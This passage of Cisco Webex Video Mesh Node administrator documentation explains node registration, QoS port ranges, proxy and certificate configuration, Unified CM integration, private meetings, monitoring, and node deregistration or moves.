* When you deploy a new Video Mesh Node, the Webex App and Webex-registered device won't recognize the new node for up to 2 hours. The clients check for cluster reachability during startup, a network change, or cache expiration. You can wait for 2 hours or, as a workaround, restart your Webex App or reboot the Webex room or desk device. Afterwards, call activity is captured in the Video Mesh reports in Control Hub.
* A Video Mesh Node registers to a single Webex organization; it is not a multitenant device.
* To understand what uses Video Mesh Node and what doesn't, see the table in  [Clients and Devices that use Video Mesh Node](#reference_7DDCC5FB68BCB4A01E9D11B73AC6E7F4).
* The Video Mesh Node can connect to your Webex site or to another customer or partner's Webex site. For example, Site A deployed a Video Mesh Node cluster and registered it with the example1.webex.com domain. If users in Site A dial in to mymeeting@example1.webex.com, they use the Video Mesh Node and a cascade can be created. If the users in site A dial yourmeeting@example2.webex.com, the Site A users will use their local Video Mesh Node and connect to the meeting on Site B's Webex organization.

What to do next

* To register additional nodes, repeat these steps.
* If an upgrade is available, we recommend that you apply it as soon as possible. To upgrade, complete the following steps:

  1. The provisioning data is pushed to the Webex cloud by the Cisco development team over secured channels. The provisioning data is signed. For the containers, the provisioning data contains name, checksum, version, and so on. Video Mesh Node also gets its provisioning data from the Webex cloud over secured channels.
  2. Once Video Mesh Node gets its provisioning data, the node authenticates with read-only credentials and downloads the container with specific checksum and name and upgrades the system. Each container running on Video Mesh Node has an image name and checksum. These attributes are uploaded to the Webex cloud using secured channels.

### Enable Quality of Service (QoS) for Video Mesh Node

Before you begin

* Make the necessary firewall port changes that are covered in the diagram and table. See [Ports and Protocols Used by Video Mesh](#reference_931D7E96CA43B51A44E9A01B14BEB0F4).
* For Video Mesh nodes to be enabled for QoS, the nodes must be online. Nodes in maintenance mode or offline states are excluded when you enable this setting.

| 1 | From the customer view in <https://admin.webex.com>, go to Services > Hybrid, click Edit settings on the Video Mesh card. |
| --- | --- |
| 2 | Scroll to Quality of Service and click Enable.  When enabled, you get the large, discrete port range (determined by on-premises call control configuration) that's used for audio and video for on-premises SIP clients/endpoints and intracluster cascades with unique DSCP markings:.   * Audio: 52500–62999 DSCP EF (Expedited Forwarding) * Video/Content: 63000–65500 DSCP AF41   All SIP and cascade traffic from Video Mesh nodes is marked with EF for audio and AF41 for video. The discrete port ranges are used as source ports for cascade media to other Video Mesh nodes and cloud media nodes as well as source and destination ports for SIP client media. Webex Teams apps and cascade media continue to use the destination shared port of 5004 and 9000.  All Video Mesh return traffic (audio, video, content) from the shared ports is marked with AF41. The audio traffic needs to be remarked to EF in your network, based on the source port numbers.    A status message appears that shows which nodes are being enabled one-by-one for the QoS port range. You can click review pending nodes to see a list of nodes that are pending for QoS. Enabling this setting can take up to 2 hours, depending on call traffic on the nodes. |
| 3 | If QoS is not fully enabled in 2 hours, [open a case with support](https://mycase.cloudapps.cisco.com/case) for further investigation.  The nodes reboot and are updated with the new port range. |

If you decide to disable the setting, you get the small, consolidate port range that's used for both audio and video (34000–34999). All traffic from Video Mesh nodes (SIP, cascades, cloud traffic, and so on) gets a single marking of AF41.

### Verify Video Mesh Node Port Ranges With Reflector Tool in the Web Interface

The reflector tool (a combination of a server on the Video Mesh node and client through a Python script) is used to verify whether the required TCP/UDP ports are open from Video Mesh nodes.

Before you begin

* Download a copy of the Reflector Tool Client (a Python script) from <https://github.com/CiscoDevNet/webex-video-mesh-reflector-client>.
* For the script to work properly, ensure that you're running Python 2.7.10 or later in your environment.
* Currently, this tool supports SIP endpoints to Video Mesh nodes and intracluster verification.

| 1 | From the customer view in <https://admin.webex.com>, enable maintenance node for the Video Mesh Node by following [these instructions](https://help.webex.com/article/nxep7tb). |
| --- | --- |
| 2 | Wait for the node to show a 'Ready for maintenance' status in Control Hub. |
| 3 | Open the Webex Video Mesh node interface.  For instructions, see [Manage Video Mesh Node From the Web Interface](#id_107185). |
| 4 | Scroll to Reflector Tool, and then start either the TCP Reflector Server or UDP Reflector Server, depending on what protocol you want to use. |
| 5 | Click Start Reflector Server, and then wait for the server to start successfully.  You'll see a notice when the server starts. |
| 6 | From a system (such as a PC) on a network that you want Video Mesh nodes to reach, run the script with the following command:  ``` $ python <local_path_to_client_script>/reflectorClient.py --ip <ip address of the server> --protocol <tcp or udp> ```   At the end of the run, the client shows a success message if all the required ports are open:    The client shows a failed message if any required ports are not open: |
| 7 | Resolve any port issues on the firewall and then rerun the above steps. |
| 8 | Run the client with `--help` to get more details. |

### Configure Video Mesh Node for Proxy Integration

Use this procedure to specify the type of proxy that you want to integrate with a Video Mesh. If you choose a transparent inspecting proxy or an explicit proxy, you can use the node's interface to upload and install the root certificate, check the proxy connection, and troubleshoot any potential issues.

Before you begin

* See [Proxy Support for Video Mesh](#reference_174915582680CA066C7722261618BB0C) for an overview of the supported proxy options.
* [Requirements for Proxy Support for Video Mesh](#id_71084)

|  |  |
| --- | --- |
| 1 | Enter the Video Mesh setup URL `https://[IP or FQDN/setup` in a web browser, enter the admin credentials you set up for the node, and then click Sign In. |
| 2 | Go to Trust Store & Proxy, and then choose an option:   * **No Proxy**—The default option before you integrate a proxy. No certificate update is required. * **Transparent Non-Inspecting Proxy**—Video Mesh nodes are not configured to use a specific proxy server address and should not require any changes to work with a non-inspecting proxy. No certificate update is required. * **Transparent Inspecting Proxy**—Video Mesh nodes are not configured to use a specific proxy server address. No http(s) configuration changes are necessary on Video Mesh; however, the Video Mesh nodes need a root certificate so that they trust the proxy. Inspecting proxies are typically used by IT to enforce policies regarding which websites can be visited and types of content that are not permitted. This type of proxy decrypts all your traffic (even https). * **Explicit Proxy**—With explicit proxy, you tell the client (Video Mesh nodes) which proxy server to use, and this option supports several authentication types. After you choose this option, you must enter the following information:   1. **Proxy IP/FQDN**—Address that can be used to reach the proxy machine.   2. **Proxy Port**—A port number that the proxy uses to listen for proxied traffic.   3. **Proxy Protocol**—Choose **http** (Video Mesh tunnels its https traffic through the http proxy) or **https** (traffic from the Video Mesh node to the proxy uses the https protocol). Choose an option based on what your proxy server supports.   4. Choose from among the following authentication types, depending on your proxy environment:             | Option | Usage |      | --- | --- |      | **None** | Choose for HTTP or HTTPS explicit proxies where there's no authentication method. |      | **Basic** | Available for HTTP or HTTPS explicit proxies.  Used for an HTTP user agent to provide a username and password when making a request, and uses Base64 encoding. |      | **Digest** | Available for HTTPS explicit proxies only.  Used to confirm the account before sending sensitive information, and applies a hash function on the user name and password before sending over the network. |      | **NTLM** | Available for HTTP explicit proxies only.  Like Digest, used to confirm the account before sending sensitive information. Uses Windows credentials instead of the username and password.  If you choose this option, enter the Active Directory domain that the proxy uses for authentication in the NTLM Domain field. Enter the name of the proxy workstation (also referred to as a workstation account or machine account) within the specified NTLM domain in the NTLM Workstation field. |   Follow the next steps for a transparent inspecting or explicit proxy. |
| 3 | Click Upload a Root Certificate or End Entity Certificate, and then locate and choose the root certificate for the explicit or transparent inspecting proxy.  The certificate is uploaded but not yet installed because the node needs to be rebooted to install the certificate. Click the arrow by the certificate issuer name to get more details or click Delete if you made a mistake and want to reupload the file. |
| 4 | For transparent inspecting or explicit proxies, click Check Proxy Connection to test the network connectivity between the Video Mesh node and the proxy.  If the connection test fails, you'll see an error message that shows the reason and how you can correct the issue. |
| 5 | After the connection test passes, for explicit proxy, turn the toggle on to Route all port 443 https requests from this node through the explicit proxy. This setting requires 15 seconds to take effect. |
| 6 | Click Install All Certificates Into the Trust Store (﻿appears whenever a root certificate was added during proxy setup) or Reboot (appears if no root certificate was added), read the prompt, and then click Install if you're ready.  The node reboots within a few minutes. |
| 7 | After the node reboots, sign in again if needed, and then open the Overview page to check the connectivity checks to make sure they are all in green status.  The proxy connection check only tests a subdomain of webex.com. If there are connectivity problems, a common issue is that some of the cloud domains listed in the install instructions are being blocked at the proxy. |

### Integrate Video Mesh With Call Control Task Flow

Configure SIP trunks to route SIP dial-in for Webex meetings on Video Mesh. SIP devices don't support direct reachability, so you must use Unified CM or VCS Expressway configuration to establish a relationship between on-premises SIP devices and your Video Mesh clusters.

Before you begin

* See [Deployment Models For Video Mesh and Cisco Unified Communications Manager](#concept_AEF93A6610AFF17868FB34813435FC45) to understand common deployment
  examples.
* Video Mesh supports either TCP or TLS between Unified CM and SIP signaling. SIP TLS is not supported for VCS Expressway.
* In Unified CM, each SIP trunk can support up to 16 Video Mesh destinations (IP addresses).
* In Unified CM, incoming ports on SIP trunk security profile can be default (Non Secure SIP Trunk Profile).
* Video Mesh supports 2 route patterns: **sitename.webex.com** and **meet.ciscospark.com**. Other route patterns are unsupported.
* Video Mesh supports 3 route patterns: **webex.com** (for [short video addresses](https://help.webex.com/7kot4fb/)), **sitename.webex.com** and **meet.ciscospark.com**. Other route patterns are unsupported.

  When you use the short video address format (**meet@webex.com**), the
  Video Mesh node always handles the call. The node handles the call even
  if the call is to a site that doesn't have Video Mesh enabled.

***Example Deployment of Video Mesh with Distributed Unified CM***

| Choose one of these options, depending on your call control environment and security requirements:   * [Configure Unified CM Secure TLS SIP Traffic Routing for Video Mesh](#id_82592) * [Configure Unified CM TCP SIP Traffic Routing for Video Mesh](#task_85522F2379FF6750950746778176C2C1) * [Configure Expressway TCP SIP Traffic Routing for Video Mesh](#task_931CA6F2A3A3B7D7E68A7B298FA05352) (TCP only)  **SIP Devices Registered to Unified CM (TLS or TCP)** Configure Unified CM with Video Mesh, using either TLS encrypted or TCP SIP traffic. You can create a trunk routing policy that reflects cluster preferences, and is highly available and resilient to device failures. If you use Unified CM Session Management Edition (SME), configure trunks on the Unified CM SME and leaf systems so that inbound and outbound calls are evenly distributed across the Unified CM servers within the Session Management cluster.  Typically, each site will have a dedicated Unified CM cluster associated with it. These clusters will be connected through intercluster SIP trunks. Each cluster will have call-in trunks to the local site for the Video Mesh nodes.  You can also configure your deployment to handle failure or overflow conditions. This configuration helps if there's an outage or if the Video Mesh clusters reached capacity. If the SIP meeting or call cannot be established with a cluster, the meeting or call will overflow to the cloud. **SIP Devices Registered to VCS or Expressway (TCP Only)** Configure neighbor zones and search rules to route SIP dial-in and dial-out for Cisco Webex meetings to Video Mesh clusters. SIP devices registered to a VCS Control or Expressway-C don't support direct reachability, so you must use a TCP-based Expressway configuration to establishes a relationship between on-premises SIP devices and your Video Mesh clusters.  You can also configure your deployment to handle failure or overflow conditions. This configuration helps if there's an outage or if the Video Mesh clusters reached capacity. If the SIP meeting or call cannot be established with a cluster, the meeting or call will overflow to the cloud through the VCS Control/Expressway-C or an Expressway C/E pair. |

### Exchange Certificate Chains Between Unified CM and Video Mesh Nodes

Complete a certificate exchange to establish two-way trust between the Unified CM and Video Mesh interfaces. With the secure trunk configuration, the certificates allow encrypted SIP traffic and SRTP media in your organization from trusted Unified CMs to land on trusted Video Mesh nodes.

In a clustered environment, you must install CA and server certificates on each node individually.

Before you begin

For security reasons, we recommend that you use a CA signed certificate on your Video Mesh nodes instead of the node's default self-signed certificate.

| 1 | Open the Video Mesh node interface (IP address/setup, for example, `https://192.0.2.0/setup`) in your browser and sign in with the node's admin credentials. |
| --- | --- |
| 2 | Go to Server Certificates and request and upload a certificate and key pair as needed:   1. (Optional) If you need a certificate issued from a certified provider, click Create a Certificate Signing Request. Fill out the required information (including the Subject Alternative Name(s), which are FQDNs that must contain the common name, and then generate the request. Download the CSR to submit the request to the provider. (You can request multiple ones. They return the certificate authority (CA) signed certificate (the private key was already generated during the CSR creation step)      The common name is not a URL. It doesn’t include any protocol (for example http:// or https://), port number, or pathname. The `commonName` field in the X.509 certificate specification represents the common name. For `https://www.example.com`, the correct value is `example.com`.  The private key is already in place when you generate a CSR. If you don't use the CSR creation step, you must upload a private key. 2. When you have the certificate and key, click Upload a Server Certificate (.crt or .pem file), choose the certificate file, then click Upload a Private Key (.key file) and enter a passphrase if you have one. 3. After you get the certificate, go to the first Video Mesh node in a cluster, click Install Server Certificate, read the prompt, click Install, then click OK.  A cloud-registered Video Mesh node gracefully shuts down, waiting up to 2 hours for any calls to end. The node then completes the certificate installation. A prompt appears when the server certificate installs. You can then reload the page to view the new certificate and key entry. 4. Click Download next to the certificate and key files to save a local copy.  Save the files somewhere that's easy to remember and leave the Video Mesh instance open in the browser tab. 5. Go to the next Video Mesh node in the cluster, fill in the passphrase, and then upload the private key file. Then click Upload a Server Certificate and then choose Install Server Certificate, read the prompt, click Install, then click OK. 6. Repeat these steps for any Video Mesh nodes in the same cluster. |
| 3 | In another browser tab, from Cisco Unified OS Administration, go to Security > Certificate Management. Enter your search criteria and click Find, then choose the filename of the certificate or Certificate Trust List (CTL) and click Download.  Save the Unified CM file somewhere that's easy to remember and leave Unified CM instance open in the browser tab. |
| 4 | Go back to the Video Mesh node interface tab, click Trust Store & Proxy, and then choose an option:   * If the Unified CM uses a CA certificate that's signed by a well-known organization, then the Video Mesh node trusts it automatically. The trust is based on the list of root certificates from the VMN node's host OS, which update periodically. * If the Unified CM uses a CA certificate that's signed by an internal enterprise CA root certificate, add that root certificate to the node. That root certificate is available from within the enterprise, but might not be downloadable from Unified CM. * Add both the ECDSA and RSA certificates that the Unified CM uses to serve external requests. These certificates can be self-signed or CA certificates. * If you downloaded a single certificate, click Upload a Root Certificate or End Entity Certificate (.crt or .pem file), and choose the CallManager.pem certificate file that you downloaded. Click Install All Certificates into the Trust Store, read the prompt, click Install, and then reboot the node. * If you downloaded a certificate chain, upload the root CA certificate and intermediate CA certificate, and then click Install All Certificates into the Trust Store, read the prompt, and then click Install.   A cloud-registered Video Mesh node gracefully shuts down, waiting up to 2 hours for any calls to end. To install the CallManager.pem certificate, the node automatically reboots. When it comes back online, a prompt appears when the CallManager.pem certificate installs on the Video Mesh node. You can then reload the page to view the new certificate. |
| 5 | Go back to the Cisco Unified OS Administration tab and click Upload Certificate/Certificate Chain. Choose the certificate name from the Certificate Purpose drop-down list, browse to the file that you downloaded from the Video Mesh node interface, and then click Open. |
| 6 | To upload the file to the server, click Upload File.  If you're uploading a certificate chain, you must upload all certificates in the chain.  Restart the affected service after uploading the certificate. When the server comes back up, you can access the CCMAdmin or CCMUser GUI to verify that your newly added certificates are in use.   You can install and manage server certificates via APIs. For more information, see [VMN Server Certificate APIs](#vmn-server-certificate-apis). |

### Enable Media Encryption for the Organization and Video Mesh Clusters

Use this procedure to turn on media encryption for your organization and individual Video Mesh clusters. This setting forces an end-to-end TLS setup and you must have a secure TLS SIP trunk in place on your Unified CM that points to your Video Mesh nodes.

| Settings | Result |
| --- | --- |
| Unified CM is configured with a secure trunk and this Video Mesh Control Hub setting is not enabled. | Calls fail. |
| Unified CM is not configured with a secure trunk and this Video Mesh Control Hub setting is enabled. | Calls won't fail but they fall back to non-secure mode. |

Cisco endpoints must also be configured with a security profile and TLS negotiation for end-to-end encryption to work. Otherwise, calls overflow to the cloud from endpoints that are not configured with TLS. We recommend that you enable this feature only if all endpoints can be configured to use TLS.

Before you begin

* [Configure Unified CM Secure TLS SIP Traffic Routing for Video Mesh](#id_82592)
* [Exchange Certificate Chains Between Unified CM and Video Mesh Nodes](#id_82611)

| 1 | From the customer view in <https://admin.webex.com>, go to Services > Hybrid, and then click Settings on the Video Mesh card. |
| --- | --- |
| 2 | Scroll to Media Encryption and toggle on the setting.  This setting makes encryption mandatory on all media channels that pass through Video Mesh nodes in your organization. Note the preceding table and caution note for situations where calls may fail and what's required for end-to-end encryption to work. |
| 3 | Click Show all and repeat the following steps on each Video Mesh cluster that you want to enable for secure SIP traffic.   1. Select a Video Mesh cluster entry in the list, and then click    Edit cluster settings. 2. Scroll to SIP Calls and check the checkbox. 3. Under Trusted SIP sources, ﻿enter the Common Name (CN) or any FQDNs that are present in the Subject Alternative Name on the Unified CM certificate (typically the FQDN of the Unified CM).  These entries are identified as trusted SIP sources and are allowed to send secure SIP calls to Webex Video Mesh. |

### Enable Video Mesh for the Webex Site

To use optimized media to the Video Mesh Node for a Webex meeting to all the Webex app and devices to join, this configuration needs to be enabled for the Webex site. Enabling this setting links Video Mesh and meeting instances in the cloud together and allows cascades to occur from Video Mesh nodes. If this setting is not enabled, the Webex app and devices will not use the Video Mesh node for Webex meetings.

| 1 | From the customer view in <https://admin.webex.com>, go to Services > Meetings, click the Webex site from the Meetings card, and then click **Settings**  to access the the Webex site configuration options. |
| --- | --- |
| 2 | Access **Common Settings** by clicking on Service > Meeting > Site Settings. From **Common Settings**, click **Cloud Collaboration Meeting Rooms (CMR)**, choose Video Mesh for **Media Resource Type**, and then click Save at the bottom.     This setting links Video Mesh and meeting instances in the cloud together and allows cascades to occur from Video Mesh nodes. The setting should populate across your environment after 15 minutes. Webex meetings that start after this change is populated will pick up the new setting. If you leave this field set to Cloud (the default option), all meetings are hosted in the cloud and the Video Mesh node is not used. |

### Assign Collaboration Meeting Rooms to Webex App Users

* If you manage your site through Control Hub:

  1. From the customer view in <https://admin.webex.com>, go to **Users > Manage Users**.

     To assign to users in bulk, see [this document](https://collaborationhelp.cisco.com/article/DOC-5361).
  2. Assign **Webex Collaboration Meeting Rooms** to users in your organization.
* If you manage your site through Site Admin:

  1. From Site Admin, go to **User Management**.
  2. Edit the user account and check Collaboration Meeting Room.

     To assign to users in bulk, see [this document](https://collaborationhelp.cisco.com/article/ng17y2u).

### Verify the meeting experience on the secure endpoint

Use these steps to verify that the endpoints are securely registered and the correct meeting experience appears.

| 1 | Join a meeting from the secured endpoint. |
| --- | --- |
| 2 | Verify that the meeting roster list appears on the device.  This example shows how the meeting list looks on an endpoint with a touch panel: |
| 3 | During the meeting, access the Webex Conference information from Call Details. |
| 4 | Verify that Encryption section shows the Type as AES-128 and the Status as On. |

### Video Mesh Analytics

Analytics provide information about how you use your on-premises Video Mesh nodes and clusters in your Webex organization. With the historical data in the metrics view, you can more effectively manage your Video Mesh resources by monitoring the capacity, utilization, and availability of your on-premises resources. You can use this information to make decisions about adding more Video Mesh nodes to a cluster or creating new clusters, for example. Video Mesh analytics can be found in Control Hub under Analytics > Video Mesh.

To help with analyzing the data in your organization, you can zoom in on data that appears on the graph and isolate a specific time period. For Analytics, you can also slice and dice reports to show more granular details.

Video Mesh analytics and troubleshooting reports show data in the time zone that is set for the local browser.

#### Analytics

Video Mesh analytics provide a long-term trend (up to 3 months of data) in the categories of engagement, resource usage, and bandwidth usage.

![](https://cisco-api.ingeniuxondemand.com/DITA/content/en/us/td/i/400001-500000/420001-430000/429001-430000/429530.jpg)

#### Live Monitoring

The live monitoring tab provides a near-realtime view of activity in your organization: up to 1 minute aggregation and the ability to view the last 4 hours or 24 hours on all clusters or specific clusters. This tab in Control Hub is automatically refreshed—every 1 minute for the last 4 hours and every 10 minutes for the last 24 hours.

#### Access, Filter, and Save Video Mesh Live Monitoring Reports

#### Available analytics for Video Mesh

For details of the available analytics in Control Hub, see the Video Mesh section of [Analytics for Your Cloud Collaboration Portfolioxm-replace\_text Paragraph?](https://help.webex.com/en-us/article/n0rlwxe/Analytics-for-Your-Cloud-Collaboration-Portfolio#reference_6BD0C55C82E93E3BB70176A4BCC4C8BF).

### Monitoring Tool for Video Mesh

The Monitoring tool in [Control Hub](https://admin.webex.com) helps your organization in monitoring the health of your Video Mesh deployment. You can run the following tests on your Video Mesh nodes, clusters, or both to get results for specific parameters.

* **Signaling Test** - Tests whether SIP signaling and media signaling occurs between the Video Mesh node and Webex cloud media services.
* **Cascade Test** - Tests whether a cascade can be established between the Video Mesh node and Webex cloud media services.
* **Reachability Test** - Tests whether the Video Mesh node can reach the destination ports for media streams in Webex cloud media services. It also tests if the Video Mesh node is able to communicate with the cloud clusters associated with media containers through those ports.

When you run a test, the tool creates a simulated meeting. After the test finishes, you see a simple pass or fail result with inline troubleshooting tips in the report. You can schedule the test to run periodically or run the test on demand. For more information, see [Media Health Monitoring for Video Mesh](https://help.webex.com/en-us/article/npgz5ph/Media-Health-Monitoring-for-Video-Mesh).

#### Run an immediate test

Use this procedure to run an on-demand media health monitoring and reachability test on Video Mesh nodes and/or clusters registered to your Control Hub organization. The results are captured in Control Hub and are aggregated every 6 hours starting at 00:00 UTC.

| 1 | Log in to [Control Hub](https://admin.webex.com), then go to Troubleshooting > Video Mesh. |
| --- | --- |
| 2 | Click on Configure Test, click Test now, then check the nodes and/or clusters you want to test.   If you want to clear the boxes you've checked and restore your last configuration, click Restore last test configuration. |
| 3 | Click Run test. |

What to do next

The results appear in the monitoring tool overview page in Control Hub. By default, results of all the tests are displayed together. Click on Signalling, Cascade, or Reachability to filter the results according to the specific test.

The points on the timeline with slider show aggregated test results for the entire organization. The cluster-level timelines show aggregated results for each cluster.

The timeline might display dates in the US format. Change your language in the profile settings to view dates in your local format.

![](https://cisco-api.ingeniuxondemand.com/DITA/content/en/us/td/i/400001-500000/450001-460000/451001-452000/451810.jpg)

Hover over the points on the timelines to see the test results. You can also see detailed test results for each node. Click on a point on the cluster-level timeline to view detailed results.

The results are displayed in a side panel and split into Signaling, Cascasde and Reachabilty. You can view whether the test was a success, if it was skipped, or if the test failed. Error codes with possible fixes are also displayed with the results.

Use the toggle provided to view the success rates of various parameters in the form of a table.

A skipped test, partial failure, or failure is not critical unless it occurs continuously over a period of time.
#### Configure periodic tests

Use this procedure to configure and start periodic media health monitoring and reachability tests. These tests run every 6 hours by default. You can run these tests at cluster-wide, cluster-specific, or node-specific levels. The results are captured in Control Hub and are aggregated every 6 hours starting at 00:00 UTC.

### Enable 1080p HD Video for On-Premises SIP Devices in Video Mesh Node Meetings

This setting allows your organization to favor 1080p high-definition video for on-premises registered SIP endpoints, with a trade off of lower meeting capacity. A Video Mesh Node must host the meeting. Participants can use 1080p 30fps video provided that:

* They're all inside the corporate network.
* They're using an on-premises registered high definition-capable SIP device.

The setting applies to all clusters that contain Video Mesh nodes.

Cloud-registered devices continue to send and receive 1080p streams, regardless of this setting being turned on or off.

| 1 | From the customer view in <https://admin.webex.com>, go to Services > Hybrid, and then click Settings on the Video Mesh card. |
| --- | --- |
| 2 | Toggle on Video Quality.  If this setting is off, the default is 720p. |

For video resolutions that the Webex App supports, see [Video Specifications for Calls and Meetings](https://collaborationhelp.cisco.com/article/nckc1aeb).

### Private Meetings

The Private Meeting feature enhances the security of your meeting by terminating the
media on your premises. When you schedule a private meeting, the media always terminates
on the Video Mesh nodes inside your corporate network with no cloud cascade.

As shown here, private meetings never cascade media to the cloud. The media terminates entirely on your Video Mesh clusters. Your Video Mesh clusters can only cascade with each other.

You can reserve a Video Mesh cluster for private meetings. When the reserved cluster is
full, the private meeting media cascades out to your other Video Mesh clusters. When the
reserved cluster is full, private meetings and non-private meetings share the resources
of your remaining clusters.

Non-private meetings don’t use reserved clusters, reserving those resources for the private meetings. If a non-private meeting runs out of resources on your network, it cascades out to the Webex cloud instead.

The Webex App with the Full Featured Webex Experience enabled is incompatible with
Video Mesh. For details, see [Clients and Devices That Use Video Mesh Node](#reference_7DDCC5FB68BCB4A01E9D11B73AC6E7F4).

#### Support and Limitations for Private Meetings

Video Mesh supports private meetings as follows:

* Private meetings are available on Webex Version 40.12 and above.
* Only scheduled meetings can use the private meeting type. See the [Schedule a Cisco Webex Private Meeting](https://help.webex.com/nts1l4cb/) article for details.
* Private meetings are not available for [full-featured meetings](https://help.webex.com/pjbyqb/) started or joined from Webex App.
* You can use any current Video Mesh supported device.
* Your nodes can use any current image: 72vCPU and 23vCPU.
* Private meeting logic doesn’t create any gaps in metrics. We collect the same metrics for Control Hub as for non-private meetings.

  Because some users don't activate this feature, the analytics reports for private meetings don't appear if your org doesn't have a private meeting in 90 days.
* Private meetings support 1-Way Whiteboarding from a video endpoint.

##### Limitations

Private meetings have these limitations:

* Private meetings only support VoIP for audio. They don’t support Webex Edge Audio or PSTN.
* You can’t use a personal meeting room (PMR) for a private meeting.
* Private meetings don’t support Webex features that require a connection to the cloud, such as, Cloud Recording, Transcription, and Webex Assistant.
* You can’t join a private meeting from an unauthenticated cloud registered video system, even one that has paired to the Webex app.

#### Use Private Meetings as the Default Meeting Type

In Control Hub, you can specify that future scheduled meetings for your organization
be private meetings.

| 1 | From the customer view in <https://admin.webex.com>, go to Services > Hybrid. |
| --- | --- |
| 2 | Click Edit settings from the Video Mesh card. Scroll to  Private Meetings and enable the setting. |
| 3 | Save your change. |

When you enable this setting, it applies to all meetings for your organization, even
those previously scheduled.

#### (Optional) Reserve a Cluster for Private Meetings

Private and non-private meetings normally use the same Video Mesh resources. But,
because private meetings must keep media local, they can’t set up overflows to the
cloud when the local resources are exhausted. To mitigate that possibility, you can
set up a Video Mesh cluster to host only private meetings.

In Control Hub, you configure the cluster exclusively for hosting private meetings.
This setting prevents non-private meetings from using that cluster. Private meetings
default to using that cluster. If the cluster runs out of resources, private
meetings cascade only to your other Video Mesh clusters.

We recommend that you provision a private cluster to handle your expected peak usage
from private meetings.

You can't use the short video address format (meet@your\_site) if you reserve all Video Mesh clusters for private meetings. These calls currently fail without a proper error message. If you leave some clusters unreserved, calls with the short video address format can connect through those clusters.

| 1 | From the customer view in <https://admin.webex.com>, go to Services > Hybrid and click Show all on the Video Mesh card. |
| --- | --- |
| 2 | Select your Video Mesh cluster from the list and click Edit cluster settings. |
| 3 | Scroll to Private Meetings and enable the setting. |
| 4 | Save your change. |

#### Error Messages for Private Meetings

This table lists the possible errors that users might see when joining a private
meeting.

| Error Message | User Action | Reason |
| --- | --- | --- |
| **External Network Access Denied**  You need to be on the corporate network to attend the Private Meeting. Paired Webex devices located outside the corporate network would not be able to join the meeting, in such a scenario try connecting your laptop, mobile to the corporate network and join the meeting in unpaired mode. | An external user joins from outside the corporate network without VPN or MRA. | To join a private meeting, external users need access to the corporate network through a VPN or MRA. |
| An external user is on VPN, but they're paired to an unauthenticated device. | Device media doesn't tunnel to the corporate network through the VPN. The device can't join a private meeting.  Instead, after connecting to VPN, the remote user should join a private meeting in device unpaired mode from their desktop or mobile client. |
| **No Available Clusters**  The clusters hosting this private meeting are at peak capacity, unreachable, offline, or not registered. Please contact your IT admin for assistance. | A user is on the corporate network (on-premises or remote by VPN), but can’t join a private meeting. | Your Video Mesh clusters are:   * At capacity * Unreachable * Offline * Not registered |
| **Not Authorized**  You are not authorized to attend this Private meeting as you are not a member of the Host Organization. Please reach out to the Host of the meeting. | A user from a different org than the host org tries to join the private meeting. | Only users belonging to the host org can join a private meeting. |
| A device from a different org than the host org tries to join the private meeting. | Only devices belonging to the host org can join a private meeting. |

### Keep your media on Video Mesh for all external Webex meetings

When your media runs through your local Video Mesh nodes, you get better performance and use less internet bandwidth.

In previous releases, you controlled the use of Video Mesh for meetings only for your internal sites. For meetings that are hosted on external Webex sites, those sites controlled if Video Mesh could cascade to Webex. If an external site didn't allow Video Mesh cascades, your media always used the Webex cloud nodes.

With the Prefer Video Mesh for All External Webex Meetings setting, if your Webex site has available Video Mesh nodes, your media runs through those nodes for meetings hosted on external Webex sites. This table summarizes the behavior for your participants joining Webex meetings:

| Setting is... | Meeting on internal Webex site with Video Mesh cascades enabled | Meeting on internal Webex site with Video Mesh cascades disabled | Meeting on external Webex site with Video Mesh cascades enabled | Meeting on external Webex site with Video Mesh cascades disabled |
| --- | --- | --- | --- | --- |
| Enabled | Media uses your Video Mesh nodes. | Media uses cloud nodes. | Media uses your Video Mesh nodes. | Media uses your Video Mesh nodes. |
| Disabled | Media uses your Video Mesh nodes. | Media uses cloud nodes. | Media uses your Video Mesh nodes. | Media uses cloud nodes. |

This setting is off by default, which maintains the behavior from previous releases. In those releases, your Video Mesh didn’t cascade to Webex and your participants joined through the Webex cloud nodes.

| 1 | In the customer view in <https://admin.webex.com>, go to Services > Hybrid and click Show all on the Video Mesh card. |
| --- | --- |
| 2 | Select your Video Mesh cluster in the list and click Edit settings. |
| 3 | Scroll to Prefer Video Mesh for All External Webex Meetings and enable the setting. |
| 4 | Save your change. |

### Optimize utilization of your Video Mesh deployment

You can land all your clients on your Video Mesh clusters for an improved user experience through Video Mesh. If your Video Mesh cluster capacity is temporarily down or you have increased usage, you can optimize your Video Mesh cluster utilization by controlling which client types land on Video Mesh clusters. This helps manage your existing capacity effectively until you can add more nodes to meet the demand.

See the [Analytics portal on Control Hub](https://admin.webex.com/reports/hybridMediaReportsV4) to understand usage, utilization, redirect, and overflow trends. Based on these trends, you could, for example, choose to have the desktop clients or SIP devices land on Video Mesh clusters, and have the mobile clients land on Webex cloud nodes. Compared to the mobile clients, the desktop clients and SIP devices support higher resolution, have larger screens, and use more bandwidth, and you can optimize the user experience for the participants using those client types.

You can also optimize the cluster capacity and maximize the user experience by having the client types that most of your customers use land on Video Mesh clusters.

| 1 | [Sign in to Control Hub](https://admin.webex.com/), then select Services > Hybrid > Video Mesh > Resources > View all. xm-replace\_text Step Command (action user performs)?  - or -  Select Overview > Hybrid services > Video Mesh > Settings. |
| --- | --- |
| 2 | Under Client Type Inclusion Settings, all client types are checked by default. Uncheck the client types you want to exclude from using the Video Mesh clusters. These clusters are hosted on Webex cloud nodes. |
| 3 | Click Save. |

### Deregister Video Mesh Node

Use this procedure to remove a Video Mesh node from the Webex cloud. Completing this procedure removes your node from its cluster making it unavailable for use. After deregistering a node, the only way to make it available again is to reregister it.

| 1 | From the customer view in <https://admin.webex.com>, go to Services > Hybrid. |
| --- | --- |
| 2 | Click View all on the Video Mesh card. |
| 3 | From the list of resources, go to the appropriate cluster and choose the node. |
| 4 | Click Action > Deregister Node.  A message appears asking you to confirm that you want to delete the node. |
| 5 | After you read and understand the message, click Deregister Node. |

### Move Video Mesh Node

You may want to move a node from one cluster to another. For example, you may have a new cluster that you want to redistribute nodes to. Use this procedure to move a Video Mesh node. After completing this procedure, your node will only be available to the new resource.

| 1 | From the customer view in <https://admin.webex.com>, go to Services > Hybrid, and then choose View all on the Video Mesh card. |
| --- | --- |
| 2 | From the list, select the node that you want to move and then click Actions (the vertical ellipsis). |
| 3 | Select Move Node. |
| 4 | Choose the appropriate radio button for where you want to move the node:   * Select an existing cluster—Choose an existing   cluster from the drop-down list. * Create a new cluster—Enter a name for the new   cluster in the field. |
